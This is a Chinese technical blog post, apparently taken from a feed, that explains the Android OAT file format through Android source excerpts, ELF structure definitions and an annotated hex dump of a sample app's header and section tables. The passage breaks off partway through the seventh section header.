        <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>oat文件是Android私有的ELF格式文件，包括标准的ELF文件头，用section描述文件信息。作为Android私有其包含两个特殊的section：oatdata、oatexec，分别用来存储原dex文件和从dex文件翻译得到的机器指令。它们之间的关系通过存储在oatdata段前面的oat头部描述。此外，在oat文件的dynamic段，导出了三个符号：oatdata、oatexec、oatlastword，它们的值就是用来界定oatdata段和oatexec段的起止位置的。其中，[oatdata,oatexec-1]描述的是oatdata的起止位置[oatexec,oatlastword+3]描述的是oatexec的起止位置。</p><p><strong>.oatdata -&gt; .rodata(oatHeader、dex文件相关信息、dex原始文件、类中方法与翻译为native code的对应关系)</strong><br><strong>.oatexec -&gt; .text(native code)</strong></p><p>oat文件结构概览：</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBd91be5da5cc9c70b50ac5355d12d6e84?method=download&amp;shareKey=cfbfd9c6f94f41b648fc4d3b4ebacadb" alt="avatar"></p><h1 id="oat文件生成过程"><a href="#oat文件生成过程" class="headerlink" title="oat文件生成过程"></a>oat文件生成过程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">static void run_dex2oat(int zip_fd, int oat_fd, const char* input_file_name,    </span><br><span class="line">    const char* output_file_name, const char* dexopt_flags)    </span><br><span class="line">&#123;    </span><br><span class="line">    static const char* DEX2OAT_BIN = &quot;/system/bin/dex2oat&quot;;    </span><br><span class="line">    static const int MAX_INT_LEN = 12;      // &apos;-&apos;+10dig+&apos;\0&apos; -OR- 0x+8dig    </span><br><span class="line">    char zip_fd_arg[strlen(&quot;--zip-fd=&quot;) + MAX_INT_LEN];    </span><br><span class="line">    char zip_location_arg[strlen(&quot;--zip-location=&quot;) + PKG_PATH_MAX];    </span><br><span class="line">    char oat_fd_arg[strlen(&quot;--oat-fd=&quot;) + MAX_INT_LEN];    </span><br><span class="line">    char oat_location_arg[strlen(&quot;--oat-name=&quot;) + PKG_PATH_MAX];    </span><br><span class="line">    </span><br><span class="line">    sprintf(zip_fd_arg, &quot;--zip-fd=%d&quot;, zip_fd);    </span><br><span class="line">    sprintf(zip_location_arg, &quot;--zip-location=%s&quot;, input_file_name);    </span><br><span class="line">    sprintf(oat_fd_arg, &quot;--oat-fd=%d&quot;, oat_fd);    </span><br><span class="line">    sprintf(oat_location_arg, &quot;--oat-location=%s&quot;, output_file_name);    </span><br><span class="line">    </span><br><span class="line">    ALOGV(&quot;Running %s in=%s out=%s\n&quot;, DEX2OAT_BIN, input_file_name, output_file_name);    </span><br><span class="line">    execl(DEX2OAT_BIN, DEX2OAT_BIN,    </span><br><span class="line">          zip_fd_arg, zip_location_arg,    </span><br><span class="line">          oat_fd_arg, oat_location_arg,    </span><br><span class="line">          (char*) NULL);    </span><br><span class="line">    ALOGE(&quot;execl(%s) failed: %s\n&quot;, DEX2OAT_BIN, strerror(errno));    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>zip_fd、oat_fd指向的分别是正在安装的apk文件和要生成的oat文件。</p><p>oat文件的生成过程主要是涉及到将apk里面的classes.dex文件的dex字节码翻译成本地机器指令。这相当于编写一个输入为dex文件、输出为oat文件的编译器（基于LLVM编译框架开发，前端是dex语法分析器，借助LLVM优化器和线程的后端输出oat文件）。</p><p>apk安装过程中的输入只有一个dex文件，但实际上，一个oat文件是可以由若干个dex生成的，意味着在oat文件的oatdata段中，包含有多个dex文件。在art虚拟机启动时会加载系统预加载类组成的dex文件优化得出的oat文件（boot.art）,该oat文件中就会包含多个dex文件。</p><h1 id="oat文件加载"><a href="#oat文件加载" class="headerlink" title="oat文件加载"></a>oat文件加载</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">OatFile* OatFile::Open(const std::string&amp; filename,</span><br><span class="line">                       const std::string&amp; location,</span><br><span class="line">                       byte* requested_base,</span><br><span class="line">                       bool executable) &#123;</span><br><span class="line">  CHECK(!filename.empty()) &lt;&lt; location;</span><br><span class="line">  CheckLocation(filename);</span><br><span class="line">#ifdef ART_USE_PORTABLE_COMPILER</span><br><span class="line">  // If we are using PORTABLE, use dlopen to deal with relocations.</span><br><span class="line">  //</span><br><span class="line">  // We use our own ELF loader for Quick to deal with legacy apps that</span><br><span class="line">  // open a generated dex file by name, remove the file, then open</span><br><span class="line">  // another generated dex file with the same name. http://b/10614658</span><br><span class="line">  if (executable) &#123;</span><br><span class="line">    return OpenDlopen(filename, location, requested_base);</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br><span class="line">  // If we aren&apos;t trying to execute, we just use our own ElfFile loader for a couple reasons:</span><br><span class="line">  //</span><br><span class="line">  // On target, dlopen may fail when compiling due to selinux restrictions on installd.</span><br><span class="line">  //</span><br><span class="line">  // On host, dlopen is expected to fail when cross compiling, so fall back to OpenElfFile.</span><br><span class="line">  // This won&apos;t work for portable runtime execution because it doesn&apos;t process relocations.</span><br><span class="line">  UniquePtr&lt;File&gt; file(OS::OpenFileForReading(filename.c_str()));</span><br><span class="line">  if (file.get() == NULL) &#123;</span><br><span class="line">    return NULL;</span><br><span class="line">  &#125;</span><br><span class="line">  return OpenElfFile(file.get(), location, requested_base, false, executable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从注释可以知道，通过Portable后端和Quick后端生成的OAT文件的本质区别在于，前者使用标准的动态链接器加载，而后者使用自定义的加载器加载。</p><h1 id="oat文件格式分析案例-32位-："><a href="#oat文件格式分析案例-32位-：" class="headerlink" title="oat文件格式分析案例(32位)："></a>oat文件格式分析案例(32位)：</h1><h2 id="elf文件头"><a href="#elf文件头" class="headerlink" title="elf文件头"></a>elf文件头</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef uint16_t Elf32_Half; //2 bytes</span><br><span class="line">typedef uint32_t Elf32_Word; //4 bytes</span><br><span class="line">typedef uint32_t Elf32_Addr; //4 bytes</span><br><span class="line">typedef uint32_t Elf32_Off;  //4 bytes</span><br><span class="line">typedef int32_t  Elf32_Sword;//4 bytes</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Object file magic string.</span><br><span class="line">static const char ElfMagic[] = &#123; 0x7f, &apos;E&apos;, &apos;L&apos;, &apos;F&apos;, &apos;\0&apos; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// e_ident size and indices.</span><br><span class="line">enum &#123;</span><br><span class="line">  EI_MAG0       = 0,          // File identification index.</span><br><span class="line">  EI_MAG1       = 1,          // File identification index.</span><br><span class="line">  EI_MAG2       = 2,          // File identification index.</span><br><span class="line">  EI_MAG3       = 3,          // File identification index.</span><br><span class="line">  EI_CLASS      = 4          ,// File class.</span><br><span class="line">  EI_DATA       = 5,          // Data encoding.</span><br><span class="line">  EI_VERSION    = 6,          // File version.</span><br><span class="line">  EI_OSABI      = 7,          // OS/ABI identification.</span><br><span class="line">  EI_ABIVERSION = 8,          // ABI version.</span><br><span class="line">  EI_PAD        = 9,          // Start of padding bytes.</span><br><span class="line">  EI_NIDENT     = 16          // Number of bytes in e_ident.</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>elf文件头结构：（16+4+20+12=52字节，1+2+5+6=14项）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">struct Elf32_Ehdr&#123;</span><br><span class="line">    unsigned char e_ident[EI_NIDENT];//ELF文件魔数          16字节</span><br><span class="line">    Elf32_Half  e_type;              //ELF文件类型（32/64位）2字节  2*2</span><br><span class="line">    Elf32_Half  e_machine;           //该ELF文件所需要的架构  2字节</span><br><span class="line">    Elf32_Word  e_version;           //ELF文件版本（始终为1） 4字节   4*5</span><br><span class="line">    Elf32_Addr  e_entry;             //程序入口地址          4字节</span><br><span class="line">    Elf32_Off   e_phoff;             //segment表偏移地址     4字节</span><br><span class="line">    Elf32_Off   e_shoff;             //section表偏移地址     4字节</span><br><span class="line">    Elf32_Word  e_flags;             //标志                 4字节</span><br><span class="line">    Elf32_Half  e_ehsize;            //ELF文件头大小         2字节   2*6</span><br><span class="line">    Elf32_Half  e_phentsize;        //segment表项大小        2字节</span><br><span class="line">    Elf32_Half  e_phnum;            //segment表项数目        2字节</span><br><span class="line">    Elf32_Half  e_shentsize;        //section表项大小        2字节  </span><br><span class="line">    Elf32_Half  e_shnum;            //section表项数目        2字节</span><br><span class="line">    Elf32_Half  e_shstrndx;         //段表字符串表在section表中的下标 2字节</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// File types</span><br><span class="line">enum &#123;</span><br><span class="line">  ET_NONE   = 0,      // No file type</span><br><span class="line">  ET_REL    = 1,      // Relocatable file</span><br><span class="line">  ET_EXEC   = 2,      // Executable file</span><br><span class="line">  ET_DYN    = 3,      // Shared object file</span><br><span class="line">  ET_CORE   = 4,      // Core file</span><br><span class="line">  ET_LOPROC = 0xff00, // Beginning of processor-specific codes</span><br><span class="line">  ET_HIPROC = 0xffff  // Processor-specific</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// Machine architectures</span><br><span class="line">enum &#123;</span><br><span class="line">    EM_NONE = 0, // No machine</span><br><span class="line">    EM_ARM  = 40 // ARM</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>案例分析①：data@<a href="mailto:app@com.example.passerby.myapplication.app-1" target="_blank" rel="noopener">app@com.example.passerby.myapplication.app-1</a>@<a href="mailto:base.apk@classes.dex" target="_blank" rel="noopener">base.apk@classes.dex</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">7F 45 4C 46 01 01 01 03 00 00 00 00 00 00 00 00</span><br><span class="line">03 00 28 00 01 00 00 00 00 00 00 00 34 00 00 00</span><br><span class="line">70 50 48 00 00 00 00 05 34 00 20 00 05 00 28 00</span><br><span class="line">08 00 07 00</span><br></pre></td></tr></table></figure><p>魔数：7F 45 4C 46 //0x464c457f<br>位宽：01 //0x01代表32位；0x02代表64位<br>端序：01 //0x01代表小端；0x02代表打断<br>版本：01<br>操作系统：03 //0x03代表Linux<br>00 00 00 00 00 00 00 00<br>文件类型：03 00  //0x03:共享文件<br>芯片架构：28 00 // 0x28 ARM架构<br>文件版本：01 00 00 00 //0x01 (始终为1)<br>程序入口地址：00 00 00 00 //0x0<br>segment表偏移：34 00 00 00 //0x34<br>section表偏移：70 50 48 00 //0x485070<br>标志：00 00 00 05   //0x5000000<br>文件头大小：34 00   //0x34<br>segment表项大小：20 00  //0x20<br>segment表项数目：05 00  //0x05<br>section表项大小：28 00  //0x28<br>section表项数目：08 00  //0x08<br>段表字符串表在段表中下标：07 00 //0x07</p><hr><h2 id="程序头表"><a href="#程序头表" class="headerlink" title="程序头表"></a>程序头表</h2><p>segment头结构：（8项，每项4个字节，32字节）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct Elf32_Phdr&#123;</span><br><span class="line">    Elf32_Word  p_type;//segment类型</span><br><span class="line">    Elf32_Off   p_offset;//segment相对文件开始的偏移</span><br><span class="line">    Elf32_Addr  p_vaddr;//segment映射到内存中的首字节地址（即虚拟地址）</span><br><span class="line">    Elf32_Addr  p_paddr;//在物理地址定位有关的系统中，该字段是为该段的物理地址而保留的，对于可执行文件和共享的object而言是未指定内容的。</span><br><span class="line">    Elf32_Word  p_filesz;//在文件映像中该segment的字节数（可能是0）</span><br><span class="line">    Elf32_Word  p_memsz;//在内存映像中该segment的字节数（可能是0）</span><br><span class="line">    Elf32_Word  p_flags;//segment标志</span><br><span class="line">    Elf32_Word  p_align;//可载入的进程段必须有合适的p_vaddr、p_offset值，取页面大小的模。该字段给出了该段在内存和文件中排列值。0和1表示不需要排列。否则，p_align必须为正的2的幂</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// Segment types.</span><br><span class="line">enum &#123;</span><br><span class="line">    PT_NULL    = 0, // Unused segment.空值</span><br><span class="line">    PT_LOAD    = 1, // Loadable segment.加载到内存中</span><br><span class="line">    PT_DYNAMIC = 2, // Dynamic linking information.动态链接</span><br><span class="line">    PT_INTERP  = 3, // Interpreter pathname.动态链接的辅助信息</span><br><span class="line">    PT_NOTE    = 4, // Auxiliary information.其他信息</span><br><span class="line">    PT_SHLIB   = 5, // Reserved.RFU</span><br><span class="line">    PT_PHDR    = 6, // The program header table itself.segment表头的位置和大小</span><br><span class="line">    PT_TLS     = 7, // The thread-local storage template.</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>案例分析②：data@<a href="mailto:app@com.example.passerby.myapplication.app-1" target="_blank" rel="noopener">app@com.example.passerby.myapplication.app-1</a>@<a href="mailto:base.apk@classes.dex" target="_blank" rel="noopener">base.apk@classes.dex</a></p><p>由ELF文件头知：segment表偏移为0x34;表大小为0x05;表项大小为0x20;推出segment头表大小为：0x05*0x20=0xa0 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">06 00 00 00 34 00 00 00 34 00 00 00 34 00 00 00 //PT_PHDR  </span><br><span class="line">A0 00 00 00 A0 00 00 00 04 00 00 00 04 00 00 00   </span><br><span class="line">01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 //PT_LOAD   </span><br><span class="line">00 10 2A 00 00 10 2A 00 04 00 00 00 00 10 00 00   </span><br><span class="line">01 00 00 00 00 10 2A 00 00 10 2A 00 00 10 2A 00 //PT_LOAD   </span><br><span class="line">48 35 1E 00 48 35 1E 00 05 00 00 00 00 10 00 00   </span><br><span class="line">01 00 00 00 00 50 48 00 00 50 48 00 00 50 48 00 //PT_LOAD   </span><br><span class="line">38 00 00 00 38 00 00 00 06 00 00 00 00 10 00 00   </span><br><span class="line">02 00 00 00 00 50 48 00 00 50 48 00 00 50 48 00 //PT_DYNAMIC    </span><br><span class="line">38 00 00 00 38 00 00 00 06 00 00 00 00 10 00 00</span><br></pre></td></tr></table></figure><p>第一个segment头：<br>06 00 00 00 34 00 00 00 34 00 00 00 34 00 00 00<br>A0 00 00 00 A0 00 00 00 04 00 00 00 04 00 00 00<br>segment类型：06 00 00 00    //PT_PHDR(程序头表自身)<br>segment文件偏移：34 00 00 00<br>segment虚拟地址：34 00 00 00<br>segment物理地址：34 00 00 00<br>文件映像中该segment字节数：A0 00 00 00<br>内存映像中该segment字节数：A0 00 00 00<br>segment标志：04 00 00 00<br>segment对齐：04 00 00 00</p><p>其他segment头:<br>省略…</p><h2 id="段头表"><a href="#段头表" class="headerlink" title="段头表"></a>段头表</h2><p>section头结构：（10项，每项4个字节，40字节）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct Elf32__Shdr&#123;</span><br><span class="line">  Elf32_Word sh_name;      // Section name (index into string table), section名字，string table的索引</span><br><span class="line">  Elf32_Word sh_type;      // Section type (SHT_*),section的类型</span><br><span class="line">  Elf32_Word sh_flags;     // Section flags (SHF_*),section标记，用来描述多个属性</span><br><span class="line">  Elf32_Addr sh_addr;      // Address where section is to be loaded,若该section被加载到内存中，该字段表示其在内存中的位置</span><br><span class="line">  Elf32_Off  sh_offset;    // File offset of section data, in bytes,该section在文件中的偏移，SHT_NOBITS类型的section在文件中不占用空间，概念上的位置</span><br><span class="line">  Elf32_Word sh_size;      // Size of section, in bytes,section大小，SHT_NOBITS类型的section该值可能为非0，但是不占文件空间</span><br><span class="line">  Elf32_Word sh_link;      // Section type-specific header table index link,到section头表的链接</span><br><span class="line">  Elf32_Word sh_info;      // Section type-specific extra information,额外信息</span><br><span class="line">  Elf32_Word sh_addralign; // Section address alignment,地址对齐</span><br><span class="line">  Elf32_Word sh_entsize;   // Size of records contained within the section,一些sections保留着一张固定大小入口的表，对于此类型的section，该字段给除了每个入口的字节大小</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// Section types.</span><br><span class="line">enum &#123;</span><br><span class="line">    SHT_NULL          = 0,  // No associated section (inactive entry).</span><br><span class="line">    SHT_PROGBITS      = 1,  // Program-defined contents.</span><br><span class="line">    SHT_SYMTAB        = 2,  // Symbol table. 符号表</span><br><span class="line">    SHT_STRTAB        = 3,  // String table. 字符串表</span><br><span class="line">    SHT_RELA          = 4,  // Relocation entries; explicit addends.</span><br><span class="line">    SHT_HASH          = 5,  // Symbol hash table.</span><br><span class="line">    SHT_DYNAMIC       = 6,  // Information for dynamic linking.</span><br><span class="line">    SHT_NOTE          = 7,  // Information about the file.</span><br><span class="line">    SHT_NOBITS        = 8,  // Data occupies no space in the file.</span><br><span class="line">    SHT_REL           = 9,  // Relocation entries; no explicit addends.</span><br><span class="line">    SHT_SHLIB         = 10, // Reserved.</span><br><span class="line">    SHT_DYNSYM        = 11, // Symbol table.  动态符号表</span><br><span class="line">    SHT_INIT_ARRAY    = 14, // Pointers to initialization functions.</span><br><span class="line">    SHT_FINI_ARRAY    = 15, // Pointers to termination functions.</span><br><span class="line">    SHT_PREINIT_ARRAY = 16, // Pointers to pre-init functions.</span><br><span class="line">    SHT_GROUP         = 17, // Section group.</span><br><span class="line">    SHT_SYMTAB_SHNDX  = 18, // Indices for SHN_XINDEX entries</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>案例分析③：data@<a href="mailto:app@com.example.passerby.myapplication.app-1" target="_blank" rel="noopener">app@com.example.passerby.myapplication.app-1</a>@<a href="mailto:base.apk@classes.dex" target="_blank" rel="noopener">base.apk@classes.dex</a><br>由ELF文件头知：section表偏移为0x485070;表项大小为0x28;表项数目为0x08;推出section头表大小为0x28*0x08=0x140</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   </span><br><span class="line">00 00 00 00 00 00 00 00 01 00 00 00 0B 00 00 00   </span><br><span class="line">02 00 00 00 D4 00 00 00 D4 00 00 00 40 00 00 00   </span><br><span class="line">02 00 00 00 00 00 00 00 04 00 00 00 10 00 00 00   </span><br><span class="line">09 00 00 00 03 00 00 00 02 00 00 00 14 01 00 00   </span><br><span class="line">14 01 00 00 64 00 00 00 00 00 00 00 00 00 00 00   </span><br><span class="line">01 00 00 00 01 00 00 00 11 00 00 00 05 00 00 00   </span><br><span class="line">02 00 00 00 78 01 00 00 78 01 00 00 20 00 00 00   </span><br><span class="line">01 00 00 00 00 00 00 00 04 00 00 00 04 00 00 00   </span><br><span class="line">17 00 00 00 01 00 00 00 02 00 00 00 00 10 00 00   </span><br><span class="line">00 10 00 00 00 00 2A 00 00 00 00 00 00 00 00 00   </span><br><span class="line">00 10 00 00 00 00 00 00 1F 00 00 00 01 00 00 00   </span><br><span class="line">06 00 00 00 00 10 2A 00 00 10 2A 00 48 35 1E 00   </span><br><span class="line">00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00   </span><br><span class="line">25 00 00 00 06 00 00 00 02 00 00 00 00 50 48 00   </span><br><span class="line">00 50 48 00 38 00 00 00 01 00 00 00 00 00 00 00   </span><br><span class="line">00 10 00 00 08 00 00 00 2E 00 00 00 03 00 00 00   </span><br><span class="line">00 00 00 00 00 00 00 00 38 50 48 00 38 00 00 00   </span><br><span class="line">00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00</span><br></pre></td></tr></table></figure><p>第一个section头：//No associated section (inactive entry).<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   </span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure></p><p>第二个section头：(.dynsym) //Symbol table<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01 00 00 00 0B 00 00 00                            </span><br><span class="line">02 00 00 00 D4 00 00 00 D4 00 00 00 40 00 00 00   </span><br><span class="line">02 00 00 00 00 00 00 00 04 00 00 00 10 00 00 00</span><br></pre></td></tr></table></figure></p><p>section名称：01 00 00 00    //在字符串表中的下标<br>section类型：0B 00 00 00    //0xb 符号表 .symbol    </p><p>第三个section头：(.dynstr)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">09 00 00 00 03 00 00 00 02 00 00 00 14 01 00 00    </span><br><span class="line">14 01 00 00 64 00 00 00 00 00 00 00 00 00 00 00   </span><br><span class="line">01 00 00 00 01 00 00 00</span><br></pre></td></tr></table></figure></p><p>section名称：09 00 00 00<br>section类型：03 00 00 00    //0x3 字符串表 .strtab<br>section标记：02 00 00 00<br>section虚拟地址：14 01 00 00<br>section文件偏移：14 01 00 00 //0x0114<br>section大小：64 00 00 00   //0x64 推出结束偏移：0x178<br>section到section头表的链接：00 00 00 00<br>section额外信息：00 00 00 00<br>section对齐：01 00 00 00<br>section入口表大小：01 00 00 00    </p><p>根据section头信息，导出.dynstr内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 6F 61 74 64 61 74 61 00 6F 61 74 65 78 65 63   </span><br><span class="line">00 6F 61 74 6C 61 73 74 77 6F 72 64 00 64 61 74   </span><br><span class="line">61 40 61 70 70 40 63 6F 6D 2E 65 78 61 6D 70 6C   </span><br><span class="line">65 2E 70 61 73 73 65 72 62 79 2E 6D 79 61 70 70   </span><br><span class="line">6C 69 63 61 74 69 6F 6E 2E 61 70 70 2D 31 40 62   </span><br><span class="line">61 73 65 2E 61 70 6B 40 63 6C 61 73 73 65 73 2E   </span><br><span class="line">64 65 78 00</span><br></pre></td></tr></table></figure></p><p>对应的字符信息：<br>|索引  |  值 |<br>|—|:—:|<br>|0x0  |  \00    |<br>|0x1  | oatdata\00|<br>|0x9  | oatexec\00|<br>|0x11 | oatlastword\00|<br>|0x1d | data@<a href="mailto:app@com.example.passerby.myapplication.app-1" target="_blank" rel="noopener">app@com.example.passerby.myapplication.app-1</a>@<a href="mailto:base.apk@classes.dex" target="_blank" rel="noopener">base.apk@classes.dex</a>\00|</p><p>第四个section头：(.hash)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11 00 00 00 05 00 00 00   </span><br><span class="line">02 00 00 00 78 01 00 00 78 01 00 00 20 00 00 00   </span><br><span class="line">01 00 00 00 00 00 00 00 04 00 00 00 04 00 00 00</span><br></pre></td></tr></table></figure></p><p>section名称：11 00 00 00<br>section类型：05 00 00 00    //0x5 符号hash表    </p><p>第五个section头：(.rodata)  [原dex信息,oatdata] [oat文件头起始位置]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">17 00 00 00 01 00 00 00 02 00 00 00 00 10 00 00   </span><br><span class="line">00 10 00 00 00 00 2A 00 00 00 00 00 00 00 00 00   </span><br><span class="line">00 10 00 00 00 00 00 00</span><br></pre></td></tr></table></figure></p><p>section名称：17 00 00 00<br>section类型：01 00 00 00    //0x1 Program-defined contents<br>section标记：02 00 00 00<br>section虚拟地址：00 10 00 00<br>section文件偏移：00 10 00 00    //0x1000<br>section大小：00 00 2A 00        //0x2A0000 推出结束偏移：0x2A1000<br>section到section头表的链接：00 00 00 00<br>section额外信息：00 00 00 00<br>section对齐：00 10 00 00<br>section入口表大小：00 00 00 00    </p><p>依据section头，导出.rodata内容：<br>[rodata.txt]</p><p>第六个section头：(.text) [native code,oatexec]    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1F 00 00 00 01 00 00 00   </span><br><span class="line">06 00 00 00 00 10 2A 00 00 10 2A 00 48 35 1E 00   </span><br><span class="line">00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>section名称：1F 00 00 00<br>section类型：01 00 00 00    //0x1 Program-defined contents<br>section标记：06 00 00 00<br>section虚拟地址：00 10 2A 00<br>section文件偏移：00 10 2A 00    //0x2A1000<br>section大小：48 35 1E 00        //0x1E3548 推出结束偏移：0x484548<br>section到section头表的链接：00 00 00 00<br>section额外信息：00 00 00 00<br>section对齐：00 10 00 00<br>section入口表大小：00 00 00 00    </p><p>依据section头信息，导出.text内容：<br>[text.txt]</p><p><strong>.text段 与 .dynamic段之间有一段空区域</strong></p><p>第七个section头：(.dynamic)<br><figure class="highlight 